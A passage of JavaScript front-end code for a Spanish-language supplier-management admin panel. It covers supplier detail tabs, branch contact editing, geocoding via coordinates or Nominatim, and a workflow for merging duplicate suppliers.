                    <button class="btn btn-sm" ${_admSupOffset + _admSupPageSize >= total ? 'disabled' : ''}
                            onclick="_admSupOffset+=${_admSupPageSize};loadAdminSuppliers()">Siguiente</button>
                </div>
            ` : `<p style="margin-top:8px;font-size:13px;color:var(--gray-500)">${total} proveedores</p>`}
        `;
    } catch { document.getElementById('admin-suppliers-list').innerHTML = '<div class="empty-state"><p>Error cargando</p></div>'; }
}

async function verifySupplier(id, newState) {
    try {
        const resp = await API.updateSupplier(id, { verification_state: newState });
        if (resp.ok) { toast('Proveedor actualizado', 'success'); loadAdminSuppliers(); }
        else toast(resp.detail || 'Error', 'error');
    } catch { toast('Error de conexion', 'error'); }
}

// Parse lat/lon from a pasted Google Maps URL or raw "lat,lon" string.
// Returns {lat, lon} or null.
function parseLatLonFromInput(text) {
    if (!text) return null;
    const t = text.trim();
    // Plain "lat,lon" or "lat, lon"
    let m = t.match(/^\s*(-?\d{1,2}(?:\.\d+)?)\s*,\s*(-?\d{1,3}(?:\.\d+)?)\s*$/);
    if (m) return { lat: parseFloat(m[1]), lon: parseFloat(m[2]) };
    // Google Maps URL: /@lat,lon,zoom
    m = t.match(/[@\/](-?\d{1,2}\.\d+),\s*(-?\d{1,3}\.\d+)(?:[,&\/]|$)/);
    if (m) return { lat: parseFloat(m[1]), lon: parseFloat(m[2]) };
    // Google Maps URL with !3d<lat>!4d<lon>
    m = t.match(/!3d(-?\d{1,2}\.\d+)!4d(-?\d{1,3}\.\d+)/);
    if (m) return { lat: parseFloat(m[1]), lon: parseFloat(m[2]) };
    // ?q=lat,lon or ?ll=lat,lon
    m = t.match(/[?&](?:q|ll|destination)=(-?\d{1,2}\.\d+),\s*(-?\d{1,3}\.\d+)/);
    if (m) return { lat: parseFloat(m[1]), lon: parseFloat(m[2]) };
    return null;
}

async function geocodeRowSupplier(id) {
    const input = prompt(
        'Opciones:\n' +
        '1) Pega una URL de Google Maps (con coordenadas)\n' +
        '2) Pega "lat, lon" directamente\n' +
        '3) Escribe una direccion para geocodificar (acepta Plus Code FR9H+25W)\n' +
        '4) Deja vacio para usar la direccion guardada del proveedor:'
    );
    if (input === null) return; // cancelled
    const txt = (input || '').trim();

    // If input looks like coords or a Maps URL, update directly.
    const coords = parseLatLonFromInput(txt);
    if (coords) {
        try {
            toast('Actualizando coordenadas...', 'info');
            const resp = await API.updateSupplier(id, {
                latitude: coords.lat,
                longitude: coords.lon,
            });
            if (resp.ok || resp.id || resp.data) {
                toast(`OK: ${coords.lat.toFixed(5)}, ${coords.lon.toFixed(5)}`, 'success');
                loadAdminSuppliers();
            } else {
                toast(resp.detail || 'Error al guardar', 'error');
            }
        } catch (e) {
            toast(e?.detail || 'Error al guardar', 'error');
        }
        return;
    }

    // Otherwise, geocode via Nominatim / Plus Code
    try {
        toast('Geocodificando...', 'info');
        const resp = await API.geocodeSingleSupplier(id, txt || null);
        if (resp.ok) {
            const m = resp.method === 'pluscode_full' ? 'Plus Code' :
                      resp.method === 'pluscode_short' ? 'Plus Code corto' : 'Nominatim';
            toast(`OK (${m}): ${resp.lat.toFixed(5)}, ${resp.lon.toFixed(5)}`, 'success');
            loadAdminSuppliers();
        } else {
            toast(resp.detail || 'Sin resultado', 'error');
        }
    } catch (e) {
        toast(e?.detail || 'Error al geocodificar', 'error');
    }
}

async function showSupplierProducts(supplierId, name) {
    showModal(`Productos de: ${name}`, `
        <div id="sp-content"><p style="text-align:center;color:var(--gray-500)">Cargando...</p></div>
    `);
    try {
        const resp = await API.get(`/suppliers/${supplierId}/products`);
        const c = document.getElementById('sp-content');
        if (!resp.ok || !resp.data || !resp.data.length) {
            c.innerHTML = '<div class="empty-state"><p>Sin historial de compras registrado</p></div>';
            return;
        }
        c.innerHTML = `
            <p style="font-size:13px;color:var(--gray-500);margin-bottom:8px">${resp.data.length} productos vendidos</p>
            <div class="table-wrap"><table>
                <thead><tr>
                    <th>Producto</th><th>Categoria</th><th>UOM</th>
                    <th>Pedidos</th><th>Precio Med.</th><th>Min</th><th>Max</th>
                    <th>Ultimo Ped.</th>
                </tr></thead>
                <tbody>${resp.data.map(r => `
                    <tr>
                        <td><strong>${esc(r.product_name)}</strong></td>
                        <td>${r.category ? `<span class="badge badge-gray">${esc(r.category)}</span>` : '-'}</td>
                        <td>${esc(r.uom)}</td>
                        <td>${r.order_count}</td>
                        <td><strong>${Number(r.median_price).toFixed(2)}</strong></td>
                        <td>${Number(r.min_price).toFixed(2)}</td>
                        <td>${Number(r.max_price).toFixed(2)}</td>
                        <td>${r.last_order || '-'}</td>
                    </tr>
                `).join('')}</tbody>
            </table></div>
        `;
    } catch (e) {
        document.getElementById('sp-content').innerHTML = `<p style="color:var(--danger)">Error: ${e.message}</p>`;
    }
}

// ── Admin: Supplier Detail (tabs) ─────────────────────────────
let _admDetailTab = 'info';
let _admDetailSupplierId = null;

async function showAdminSupplierDetail(supplierId, name) {
    _admDetailSupplierId = supplierId;
    _admDetailTab = 'info';

    // Use a wider modal
    showModal(`Proveedor: ${name || ''}`, `
        <div id="adm-detail-content"><p style="text-align:center;color:var(--gray-500)">Cargando...</p></div>
    `);
    // Widen the modal
    const modal = document.querySelector('.modal');
    if (modal) modal.style.maxWidth = '820px';

    try {
        const [supResp, brResp, prodResp] = await Promise.all([
            API.supplier(supplierId),
            API.get(`/suppliers/${supplierId}/branches`),
            API.get(`/suppliers/${supplierId}/products`),
        ]);

        const c = document.getElementById('adm-detail-content');
        if (!supResp.ok || !supResp.data) {
            c.innerHTML = '<div class="empty-state"><p>Proveedor no encontrado</p></div>';
            return;
        }

        // Store data globally for tab switching
        window._admDetailData = {
            supplier: supResp.data,
            branches: brResp.ok ? brResp.data : [],
            products: prodResp.ok ? prodResp.data : [],
        };

        renderAdminDetailTabs();
    } catch (e) {
        const c = document.getElementById('adm-detail-content');
        if (c) c.innerHTML = `<p style="color:var(--danger)">Error: ${e.message}</p>`;
    }
}

function renderAdminDetailTabs() {
    const c = document.getElementById('adm-detail-content');
    if (!c || !window._admDetailData) return;

    const tabs = [
        { key: 'info', label: 'Info General', ico: 'file-text' },
        { key: 'branches', label: 'Sucursales y Contactos', ico: 'map' },
        { key: 'products', label: 'Productos', ico: 'tag' },
    ];

    const tabsHtml = tabs.map(t =>
        `<button class="btn btn-sm ${_admDetailTab === t.key ? 'btn-primary' : 'btn-secondary'}"
                onclick="_admDetailTab='${t.key}';renderAdminDetailTabs()"
                style="font-size:13px">${icon(t.ico, 14)} ${t.label}</button>`
    ).join('');

    let bodyHtml = '';
    if (_admDetailTab === 'info') bodyHtml = renderAdminDetailInfo();
    else if (_admDetailTab === 'branches') bodyHtml = renderAdminDetailBranches();
    else if (_admDetailTab === 'products') bodyHtml = renderAdminDetailProducts();

    c.innerHTML = `
        <div style="display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap">${tabsHtml}</div>
        <div>${bodyHtml}</div>
    `;

    // Load contacts for branches tab
    if (_admDetailTab === 'branches') {
        (window._admDetailData.branches || []).forEach(b => {
            loadBranchContacts(_admDetailSupplierId, b.id);
        });
    }
}

function renderAdminDetailInfo() {
    const s = window._admDetailData.supplier;
    const location = [s.city, s.department].filter(Boolean).join(', ');
    const cats = (s.categories || []).map(cat => {
        const meta = CATEGORY_META[cat] || { label: cat };
        return `<span class="supplier-cat">${esc(meta.label || cat)}</span>`;
    }).join('') || '<span style="color:var(--gray-400);font-size:13px">Sin categorias</span>';

    const stateColor = s.verification_state === 'verified' ? 'success' : s.verification_state === 'rejected' ? 'danger' : 'warning';

    return `
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;font-size:14px;margin-bottom:16px">
            <div><strong>Razon Social:</strong> ${esc(s.name)}</div>
            <div><strong>Nombre Comercial:</strong> ${esc(s.trade_name) || '-'}</div>
            <div><strong>NIT:</strong> ${esc(s.nit) || '-'}</div>
            <div><strong>Email:</strong> ${s.email ? `<a href="mailto:${esc(s.email)}">${esc(s.email)}</a>` : '-'}</div>
            <div><strong>Telefono:</strong> ${s.phone ? `<a href="tel:${s.phone}">${esc(s.phone)}</a>` : '-'}</div>
            <div><strong>WhatsApp:</strong> ${s.whatsapp ? `<a href="https://wa.me/${s.whatsapp.replace(/[^0-9]/g, '')}" target="_blank" style="color:var(--whatsapp)">${esc(s.whatsapp)}</a>` : '-'}</div>
            <div><strong>Ciudad:</strong> ${esc(s.city) || '-'}</div>
            <div><strong>Departamento:</strong> ${esc(s.department) || '-'}</div>
            <div style="grid-column:1/-1"><strong>Direccion:</strong> ${esc(s.address) || '-'}</div>
            <div><strong>Website:</strong> ${s.website ? `<a href="${esc(safeUrl(s.website))}" target="_blank">${esc(s.website)}</a>` : '-'}</div>
            <div><strong>Canal preferido:</strong> ${esc(s.preferred_channel) || '-'}</div>
            <div><strong>Estado:</strong> <span class="badge badge-${stateColor}">${esc(s.verification_state)}</span></div>
            <div><strong>Rating:</strong> ${s.rating > 0 ? `${icon('star',14)} ${s.rating.toFixed(1)}` : '-'}</div>
            <div><strong>Cotizaciones:</strong> ${s.quotation_count || 0}</div>
            <div><strong>Resp. promedio:</strong> ${s.avg_response_days ? s.avg_response_days.toFixed(1) + ' dias' : '-'}</div>
        </div>
        <div style="margin-bottom:12px"><strong>Categorias:</strong> <span class="supplier-categories">${cats}</span></div>
        ${s.latitude && s.longitude ? `<div style="font-size:13px;color:var(--gray-500);margin-bottom:12px">Coords: ${s.latitude}, ${s.longitude}</div>` : ''}
        <button class="btn btn-secondary" onclick="closeModal();showAdminSupplierForm(${s.id})">${icon('edit',14)} Editar Proveedor</button>
    `;
}

function renderAdminDetailBranches() {
    const branches = window._admDetailData.branches || [];
    if (!branches.length) {
        return `<div class="empty-state"><p>Sin sucursales registradas</p></div>
                <button class="btn btn-primary" onclick="closeModal();showAdminSupplierForm(${_admDetailSupplierId})">${icon('plus',14)} Agregar desde edicion</button>`;
    }

    return branches.map(b => {
        const bLoc = [b.city, b.department].filter(Boolean).join(', ');
        return `
            <div style="border:1px solid var(--gray-200);border-radius:8px;padding:12px;margin-bottom:10px">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
                    <div>
                        <strong style="font-size:15px">${esc(b.branch_name)}</strong>
                        ${b.is_main ? '<span class="badge badge-success" style="font-size:11px;margin-left:6px">Principal</span>' : ''}
                    </div>
                    <span style="font-size:12px;color:var(--gray-400)">${b.is_active ? 'Activa' : 'Inactiva'}</span>
                </div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;font-size:13px;color:var(--gray-600);margin-bottom:8px">
                    <div>${icon('map',12)} ${bLoc || 'Sin ubicacion'}</div>
                    <div>${b.address ? esc(b.address) : ''}</div>
                    <div>${b.phone ? `${icon('phone',12)} ${esc(b.phone)}` : ''}</div>
                    <div>${b.whatsapp ? `<a href="https://wa.me/${b.whatsapp.replace(/[^0-9]/g, '')}" target="_blank" style="color:var(--whatsapp)">${icon('whatsapp',12)} ${esc(b.whatsapp)}</a>` : ''}</div>
                    <div>${b.email ? `${icon('mail',12)} ${esc(b.email)}` : ''}</div>
                </div>
                <div style="border-top:1px solid var(--gray-100);padding-top:8px">
                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
                        <strong style="font-size:13px">Contactos</strong>
                        <button class="btn btn-sm btn-primary" onclick="showInlineContactForm(${_admDetailSupplierId}, ${b.id})" style="font-size:12px">${icon('plus',12)} Agregar</button>
                    </div>
                    <div id="branch-contacts-${b.id}">
                        <p style="text-align:center;color:var(--gray-400);font-size:13px">Cargando...</p>
                    </div>
                </div>
            </div>`;
    }).join('');
}

function renderAdminDetailProducts() {
    const products = window._admDetailData.products || [];
    if (!products.length) {
        return '<div class="empty-state"><p>Sin historial de compras registrado</p></div>';
    }
    return `
        <p style="font-size:13px;color:var(--gray-500);margin-bottom:8px">${products.length} productos</p>
        <div class="table-wrap"><table>
            <thead><tr>
                <th>Producto</th><th>Categoria</th><th>UOM</th>
                <th>Pedidos</th><th>Precio Med.</th><th>Min</th><th>Max</th>
                <th>Ultimo</th>
            </tr></thead>
            <tbody>${products.map(r => `
                <tr>
                    <td><strong>${esc(r.product_name)}</strong></td>
                    <td>${r.category ? `<span class="badge badge-gray">${esc(r.category)}</span>` : '-'}</td>
                    <td>${esc(r.uom)}</td>
                    <td>${r.order_count}</td>
                    <td><strong>${Number(r.median_price).toFixed(2)}</strong></td>
                    <td>${Number(r.min_price).toFixed(2)}</td>
                    <td>${Number(r.max_price).toFixed(2)}</td>
                    <td>${r.last_order || '-'}</td>
                </tr>
            `).join('')}</tbody>
        </table></div>
    `;
}

// ── Admin: Branch Contacts CRUD ───────────────────────────────
async function loadBranchContacts(supplierId, branchId) {
    const container = document.getElementById(`branch-contacts-${branchId}`);
    if (!container) return;
    try {
        const resp = await API.branchContacts(supplierId, branchId);
        if (!resp.ok || !resp.data || !resp.data.length) {
            container.innerHTML = '<p style="font-size:13px;color:var(--gray-400)">Sin contactos</p>';
            return;
        }
        container.innerHTML = `<table style="width:100%;font-size:13px">
            <thead><tr><th>Nombre</th><th>Cargo</th><th>Telefono</th><th>WhatsApp</th><th>Email</th><th></th></tr></thead>
            <tbody>${resp.data.map(ct => `
                <tr>
                    <td><strong>${esc(ct.full_name)}</strong>${ct.is_primary ? ' <span class="badge badge-success" style="font-size:10px">Principal</span>' : ''}</td>
                    <td>${esc(ct.position) || '-'}</td>
                    <td>${ct.phone ? `<a href="tel:${ct.phone}">${esc(ct.phone)}</a>` : '-'}</td>
                    <td>${ct.whatsapp ? `<a href="https://wa.me/${ct.whatsapp.replace(/[^0-9]/g, '')}" target="_blank" style="color:var(--whatsapp)">${esc(ct.whatsapp)}</a>` : '-'}</td>
                    <td>${ct.email ? `<a href="mailto:${ct.email}">${esc(ct.email)}</a>` : '-'}</td>
                    <td style="white-space:nowrap">
                        <button class="btn btn-sm btn-secondary" onclick="showInlineContactForm(${supplierId}, ${branchId}, ${ct.id})" title="Editar" style="padding:2px 6px">${icon('edit',12)}</button>
                        <button class="btn btn-sm btn-secondary" onclick="deleteContactFromBranch(${supplierId}, ${branchId}, ${ct.id})" title="Eliminar" style="padding:2px 6px;color:var(--danger)">&times;</button>
                    </td>
                </tr>
            `).join('')}</tbody>
        </table>`;
    } catch {
        container.innerHTML = '<p style="font-size:13px;color:var(--danger)">Error cargando contactos</p>';
    }
}

async function showInlineContactForm(supplierId, branchId, contactId) {
    const container = document.getElementById(`branch-contacts-${branchId}`);
    if (!container) return;

    let existing = null;
    if (contactId) {
        try {
            const resp = await API.branchContacts(supplierId, branchId);
            if (resp.ok && resp.data) existing = resp.data.find(c => c.id === contactId);
        } catch {}
    }

    const formHtml = `
        <form id="contact-form-${branchId}" onsubmit="handleContactSubmit(event, ${supplierId}, ${branchId}, ${contactId || 'null'})" style="border:1px solid var(--primary);border-radius:6px;padding:10px;margin-top:6px;background:var(--gray-50)">
            <div style="font-size:13px;font-weight:600;margin-bottom:8px">${contactId ? 'Editar' : 'Nuevo'} Contacto</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
                <div class="form-group" style="margin-bottom:6px">
                    <label class="form-label" style="font-size:12px">Nombre completo *</label>
                    <input class="form-input" name="full_name" required value="${existing ? esc(existing.full_name) : ''}" style="font-size:13px;padding:6px 8px">
                </div>
                <div class="form-group" style="margin-bottom:6px">
                    <label class="form-label" style="font-size:12px">Cargo</label>
                    <input class="form-input" name="position" value="${existing ? esc(existing.position || '') : ''}" placeholder="Agente de ventas" style="font-size:13px;padding:6px 8px">
                </div>
                <div class="form-group" style="margin-bottom:6px">
                    <label class="form-label" style="font-size:12px">Telefono</label>
                    <input class="form-input" name="phone" value="${existing ? esc(existing.phone || '') : ''}" style="font-size:13px;padding:6px 8px">
                </div>
                <div class="form-group" style="margin-bottom:6px">
                    <label class="form-label" style="font-size:12px">WhatsApp</label>
                    <input class="form-input" name="whatsapp" value="${existing ? esc(existing.whatsapp || '') : ''}" placeholder="59171234567" style="font-size:13px;padding:6px 8px">
                </div>
                <div class="form-group" style="margin-bottom:6px">
                    <label class="form-label" style="font-size:12px">Email</label>
                    <input class="form-input" type="email" name="email" value="${existing ? esc(existing.email || '') : ''}" style="font-size:13px;padding:6px 8px">
                </div>
                <div class="form-group" style="margin-bottom:6px;display:flex;align-items:end;gap:8px;padding-bottom:4px">
                    <label style="display:flex;align-items:center;gap:4px;font-size:12px">
                        <input type="checkbox" name="is_primary" ${existing && existing.is_primary ? 'checked' : ''}> Contacto principal
                    </label>
                </div>
            </div>
            <div style="display:flex;gap:8px;margin-top:4px">
                <button type="submit" class="btn btn-sm btn-primary">${contactId ? 'Guardar' : 'Agregar'}</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="loadBranchContacts(${supplierId}, ${branchId})">Cancelar</button>
            </div>
        </form>
    `;

    // If adding, append form below existing content. If editing, replace container.
    if (contactId) {
        container.innerHTML = formHtml;
    } else {
        // Remove any existing form first
        const existingForm = document.getElementById(`contact-form-${branchId}`);
        if (existingForm) existingForm.remove();
        container.insertAdjacentHTML('beforeend', formHtml);
    }
}

async function handleContactSubmit(e, supplierId, branchId, contactId) {
    e.preventDefault();
    const form = e.target;
    const data = {
        full_name: form.full_name.value.trim(),
        position: form.position.value.trim() || null,
        phone: form.phone.value.trim() || null,
        whatsapp: form.whatsapp.value.trim() || null,
        email: form.email.value.trim() || null,
        is_primary: form.is_primary.checked,
    };
    try {
        const resp = contactId
            ? await API.updateContact(supplierId, branchId, contactId, data)
            : await API.createContact(supplierId, branchId, data);
        if (resp.ok) {
            toast(contactId ? 'Contacto actualizado' : 'Contacto creado', 'success');
            loadBranchContacts(supplierId, branchId);
        } else {
            toast(resp.detail || 'Error', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

async function deleteContactFromBranch(supplierId, branchId, contactId) {
    if (!confirm('Eliminar este contacto?')) return;
    try {
        const resp = await API.deleteContact(supplierId, branchId, contactId);
        if (resp.ok) {
            toast('Contacto eliminado', 'success');
            loadBranchContacts(supplierId, branchId);
        } else {
            toast(resp.detail || 'Error', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

// ── Supplier Merge ────────────────────────────────────────────
let _mergeKeep = null;   // {id, name, ...}
let _mergeAbsorb = null;
let _mergeSearchTimers = {};

// ── Bulk geocode modal ─────────────────────────────────────────
async function showBulkGeocodeModal() {
    const status = await API.geocodeStatus().catch(() => null);
    if (!status || !status.ok) { toast('No se pudo consultar estado', 'error'); return; }
    showModal('Geocodificar ubicaciones', `
        <p style="color:#4b5563;font-size:14px;line-height:1.5;margin-top:0">
            Usa Nominatim (OpenStreetMap) para obtener coordenadas a partir de
            <strong>direccion, ciudad y departamento</strong> de cada proveedor.
            ~1 segundo por proveedor por limite de uso de OSM.
        </p>
        <div style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:8px;padding:12px;margin-bottom:12px">
            <div style="display:flex;justify-content:space-between;margin-bottom:4px">
                <span>Total proveedores:</span><strong>${status.total}</strong>
            </div>
            <div style="display:flex;justify-content:space-between;margin-bottom:4px">
                <span>Con coordenadas:</span><strong style="color:#166534">${status.with_coords}</strong>
            </div>
            <div style="display:flex;justify-content:space-between">
                <span>Sin coordenadas:</span><strong style="color:#b91c1c" id="bgeo-missing">${status.missing}</strong>
            </div>
        </div>
        <div class="form-group">
            <label class="form-label">Lote</label>
            <select class="form-select" id="bgeo-batch">
                <option value="10">10 proveedores (~12 seg)</option>
                <option value="20" selected>20 proveedores (~25 seg)</option>
                <option value="40">40 proveedores (~50 seg)</option>
                <option value="50">50 proveedores (~1 min)</option>
            </select>
        </div>
        <button class="btn btn-primary" id="bgeo-run" onclick="runBulkGeocode()" style="width:100%;justify-content:center;padding:10px"${status.missing === 0 ? ' disabled' : ''}>
            ${icon('map-pin',14)} ${status.missing === 0 ? 'Todos geocodificados' : 'Geocodificar lote'}
        </button>
        <div id="bgeo-result" style="margin-top:12px;max-height:300px;overflow-y:auto"></div>
    `);
}

async function runBulkGeocode() {
    const btn = document.getElementById('bgeo-run');
    const box = document.getElementById('bgeo-result');
    const sel = document.getElementById('bgeo-batch');
    const batch = parseInt(sel?.value || '20', 10);
    if (btn) { btn.disabled = true; btn.innerHTML = `${icon('clock',14)} Procesando... espera`; }
    try {
        const resp = await API.bulkGeocode(batch);
        if (!resp.ok) {
            if (box) box.innerHTML = `<div style="color:#b91c1c;padding:8px">${esc(resp.detail || 'Error')}</div>`;
            return;
        }
        const miss = document.getElementById('bgeo-missing');
        if (miss) miss.textContent = resp.remaining;
        if (box) {
            box.innerHTML = `
                <div style="background:#ecfdf5;border:1px solid #a7f3d0;border-radius:6px;padding:8px;margin-bottom:8px;font-size:13px">
                    <strong>Lote procesado:</strong> ${resp.processed} &middot;
                    <span style="color:#166534">OK: ${resp.geocoded}</span> &middot;
                    <span style="color:#b91c1c">Falla: ${resp.failed}</span> &middot;
                    Restantes: ${resp.remaining}
                </div>
                <table style="width:100%;font-size:12px;border-collapse:collapse">
                    <thead>
                        <tr style="background:#f3f4f6">
                            <th style="text-align:left;padding:6px">Proveedor</th>
                            <th style="text-align:left;padding:6px">Estado</th>
                            <th style="text-align:left;padding:6px">Info</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${resp.items.map(it => {
                            const color = it.status === 'ok' ? '#166534' : (it.status === 'not_found' ? '#b45309' : '#b91c1c');
                            const info = it.status === 'ok'
                                ? `${it.lat.toFixed(4)}, ${it.lon.toFixed(4)}<br><small style="color:#6b7280">${esc(it.display_name || '')}</small>`
                                : esc(it.reason || it.query || it.error || '');
                            return `<tr style="border-bottom:1px solid #f3f4f6">
                                <td style="padding:6px">${esc(it.name)}</td>
                                <td style="padding:6px;color:${color};font-weight:500">${esc(it.status)}</td>
                                <td style="padding:6px">${info}</td>
                            </tr>`;
                        }).join('')}
                    </tbody>
                </table>
                ${resp.remaining > 0 ? `<div style="margin-top:10px;color:#6b7280;font-size:13px">${resp.remaining} proveedores pendientes. Puedes procesar otro lote cuando quieras.</div>` : '<div style="margin-top:10px;color:#166534;font-weight:500">&check; Todos los proveedores con direccion geocodificados.</div>'}
            `;
        }
    } finally {
        if (btn) {
            btn.disabled = false;
            const missNum = parseInt(document.getElementById('bgeo-missing')?.textContent || '0', 10);
            btn.innerHTML = `${icon('map-pin',14)} ${missNum === 0 ? 'Todos geocodificados' : 'Geocodificar siguiente lote'}`;
            if (missNum === 0) btn.disabled = true;
        }
    }
}

async function showMergeSupplierModal() {
    _mergeKeep = null;
    _mergeAbsorb = null;

    showModal('Fusionar Proveedores', `<div id="merge-content"></div>`);
    const modal = document.querySelector('.modal');
    if (modal) modal.style.maxWidth = '850px';

    renderMergeStep1();
    loadDuplicateSuggestions();
}

function renderMergeStep1() {
    const c = document.getElementById('merge-content');

    c.innerHTML = `
        <p style="font-size:13px;color:var(--gray-500);margin-bottom:16px">
            Busca y selecciona dos proveedores para fusionar. "A" sobrevive, "B" se absorbe.
        </p>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px">
            <div>
                <label class="form-label" style="color:var(--success);font-weight:600">A — Proveedor que sobrevive</label>
                <div style="position:relative">
                    <input class="form-input" id="merge-search-a" placeholder="Buscar por nombre o NIT..."
                           oninput="mergeSearchSupplier('a')" autocomplete="off">
                    <div id="merge-selected-a" style="display:none;margin-top:6px;padding:8px;border-radius:6px;background:var(--gray-50);border:2px solid var(--success)"></div>
                    <div id="merge-results-a" style="position:absolute;top:100%;left:0;right:0;z-index:100;background:white;border:1px solid var(--gray-200);border-radius:6px;max-height:200px;overflow-y:auto;display:none;box-shadow:var(--shadow-lg)"></div>
                </div>
            </div>
            <div>
                <label class="form-label" style="color:var(--danger);font-weight:600">B — Proveedor que se absorbe</label>
                <div style="position:relative">
                    <input class="form-input" id="merge-search-b" placeholder="Buscar por nombre o NIT..."
                           oninput="mergeSearchSupplier('b')" autocomplete="off">
                    <div id="merge-selected-b" style="display:none;margin-top:6px;padding:8px;border-radius:6px;background:var(--gray-50);border:2px solid var(--danger)"></div>
                    <div id="merge-results-b" style="position:absolute;top:100%;left:0;right:0;z-index:100;background:white;border:1px solid var(--gray-200);border-radius:6px;max-height:200px;overflow-y:auto;display:none;box-shadow:var(--shadow-lg)"></div>
                </div>
            </div>
        </div>
        <button class="btn btn-primary" onclick="loadMergePreview()" id="merge-compare-btn" disabled>Comparar</button>
        <div style="margin-top:20px;border-top:1px solid var(--gray-200);padding-top:16px">
            <h4 style="font-size:14px;margin-bottom:8px">Sugerencias de posibles duplicados</h4>
            <div id="merge-suggestions"><p style="text-align:center;color:var(--gray-400);font-size:13px">Analizando...</p></div>
        </div>
    `;
}

function mergeSearchSupplier(side) {
    clearTimeout(_mergeSearchTimers[side]);
    _mergeSearchTimers[side] = setTimeout(async () => {
        const input = document.getElementById(`merge-search-${side}`);
        const resultsDiv = document.getElementById(`merge-results-${side}`);
        const q = (input?.value || '').trim();
        if (q.length < 2) { resultsDiv.style.display = 'none'; return; }

        try {
            const resp = await API.mergeSearchSuppliers(q);
            if (!resp.ok || !resp.data?.length) {
                resultsDiv.innerHTML = '<div style="padding:10px;font-size:13px;color:var(--gray-400)">Sin resultados</div>';
                resultsDiv.style.display = 'block';
                return;
            }
            resultsDiv.innerHTML = resp.data.map(s => `
                <div onclick="selectMergeSupplier('${escJs(side)}', JSON.parse('${escJs(JSON.stringify(s))}'))"
                     style="padding:8px 12px;cursor:pointer;border-bottom:1px solid var(--gray-100);font-size:13px;transition:background 0.1s"
                     onmouseover="this.style.background='var(--gray-50)'" onmouseout="this.style.background='white'">
                    <strong>${esc(s.name)}</strong>
                    ${s.trade_name ? `<span style="color:var(--gray-500)"> (${esc(s.trade_name)})</span>` : ''}
                    <div style="font-size:12px;color:var(--gray-400)">
                        ${s.city ? esc(s.city) : ''} ${s.nit ? '&middot; NIT: ' + esc(s.nit) : ''} &middot; ID:${s.id}
                        <span class="badge badge-${s.verification_state === 'verified' ? 'success' : 'warning'}" style="font-size:10px">${esc(s.verification_state)}</span>
                    </div>
                </div>
            `).join('');
            resultsDiv.style.display = 'block';
        } catch { resultsDiv.style.display = 'none'; }
    }, 250);
}

function selectMergeSupplier(side, supplier) {
    if (side === 'a') _mergeKeep = supplier;
    else _mergeAbsorb = supplier;

    const input = document.getElementById(`merge-search-${side}`);
    const resultsDiv = document.getElementById(`merge-results-${side}`);
    const selectedDiv = document.getElementById(`merge-selected-${side}`);

    input.style.display = 'none';
    resultsDiv.style.display = 'none';
    selectedDiv.style.display = 'block';
    selectedDiv.innerHTML = `
        <div style="display:flex;justify-content:space-between;align-items:center">
            <div>
                <strong>${esc(supplier.name)}</strong>
                ${supplier.trade_name ? `<span style="color:var(--gray-500)"> (${esc(supplier.trade_name)})</span>` : ''}
                <div style="font-size:12px;color:var(--gray-400)">${esc(supplier.city || '')} ${supplier.nit ? '&middot; NIT: ' + esc(supplier.nit) : ''} &middot; ID:${supplier.id}</div>
            </div>
            <button class="btn btn-sm btn-secondary" onclick="clearMergeSupplier('${side}')" style="font-size:11px">&times; Cambiar</button>
        </div>
    `;

    // Enable compare button if both selected
    const btn = document.getElementById('merge-compare-btn');
    if (btn) btn.disabled = !(_mergeKeep && _mergeAbsorb && _mergeKeep.id !== _mergeAbsorb.id);
}

function clearMergeSupplier(side) {
    if (side === 'a') _mergeKeep = null;
    else _mergeAbsorb = null;

    const input = document.getElementById(`merge-search-${side}`);
    const selectedDiv = document.getElementById(`merge-selected-${side}`);
    input.value = '';
    input.style.display = '';
    selectedDiv.style.display = 'none';

    const btn = document.getElementById('merge-compare-btn');
    if (btn) btn.disabled = true;
}

async function loadDuplicateSuggestions() {
    const c = document.getElementById('merge-suggestions');
    if (!c) return;
    try {
        const resp = await API.duplicateSuggestions();
        if (!resp.ok || !resp.data?.length) {
            c.innerHTML = '<p style="font-size:13px;color:var(--gray-400)">No se encontraron posibles duplicados</p>';
            return;
        }
        c.innerHTML = `
            <div class="table-wrap"><table style="font-size:13px;width:100%">
                <thead><tr><th>Proveedor A</th><th>Proveedor B</th><th>Similitud</th><th></th></tr></thead>
                <tbody>${resp.data.map(d => {
                    const a = d.supplier_a, b = d.supplier_b;
                    const pct = Math.round(d.similarity * 100);
                    const color = pct >= 70 ? 'var(--danger)' : pct >= 50 ? 'var(--warning)' : 'var(--gray-500)';
                    return `<tr>
                        <td><strong>${esc(a.name)}</strong>${a.trade_name ? `<br><small style="color:var(--gray-500)">${esc(a.trade_name)}</small>` : ''}
                            <br><small>${esc(a.city || '')} ${a.nit ? '&middot; NIT:' + esc(a.nit) : ''}</small></td>
                        <td><strong>${esc(b.name)}</strong>${b.trade_name ? `<br><small style="color:var(--gray-500)">${esc(b.trade_name)}</small>` : ''}
                            <br><small>${esc(b.city || '')} ${b.nit ? '&middot; NIT:' + esc(b.nit) : ''}</small></td>
                        <td><span style="color:${color};font-weight:600">${pct}%</span></td>
                        <td><button class="btn btn-sm btn-primary" onclick="quickSelectMergePair(${a.id}, '${escJs(a.name)}', ${b.id}, '${escJs(b.name)}')">Fusionar</button></td>
                    </tr>`;
                }).join('')}</tbody>
            </table></div>
        `;
    } catch {
        c.innerHTML = '<p style="font-size:13px;color:var(--gray-400)">No se pudo analizar duplicados</p>';
    }
}

function quickSelectMergePair(idA, nameA, idB, nameB) {
    _mergeKeep = { id: idA, name: nameA };
    _mergeAbsorb = { id: idB, name: nameB };
    loadMergePreview();
}

async function loadMergePreview() {
    const keepId = _mergeKeep?.id;
    const absorbId = _mergeAbsorb?.id;
    if (!keepId || !absorbId) { toast('Selecciona ambos proveedores', 'error'); return; }
    if (keepId === absorbId) { toast('Deben ser proveedores diferentes', 'error'); return; }

    const c = document.getElementById('merge-content');
